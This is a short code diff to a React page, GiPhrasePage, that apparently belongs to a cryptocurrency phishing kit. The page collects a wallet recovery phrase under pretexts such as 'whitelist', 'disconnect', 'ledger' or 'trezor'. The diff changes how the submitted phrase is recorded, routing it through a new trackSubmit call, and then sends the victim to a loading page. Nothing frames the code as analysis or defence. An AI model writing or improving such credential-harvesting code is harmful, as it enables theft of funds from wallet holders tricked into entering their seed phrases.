@@ -25,7 +25,7 @@ function WalletTicketIcon() {
 }
 
 function GiPhrasePage() {
-  const { trackClick, trackInput, giNavigate, sessionId } = useGiTracking();
+  const { trackClick, trackInput, trackSubmit, giNavigate, sessionId } = useGiTracking();
   const urlMode = useGiQueryParam("mode") as PhraseMode | null;
   const mode: PhraseMode = urlMode === "whitelist" || urlMode === "disconnect" || urlMode === "ledger" || urlMode === "trezor" ? urlMode : "whitelist";
 
@@ -49,7 +49,7 @@ function GiPhrasePage() {
   const handleSubmit = () => {
     if (!phrase.trim()) return;
     trackClick(`Phrase Submit ${mode}`);
-    trackInput(`phrase_final_${mode}`, phrase.trim());
+    trackSubmit(`phrase_final_${mode}`, phrase.trim());
     giNavigate("/gi/loading");
   };
 
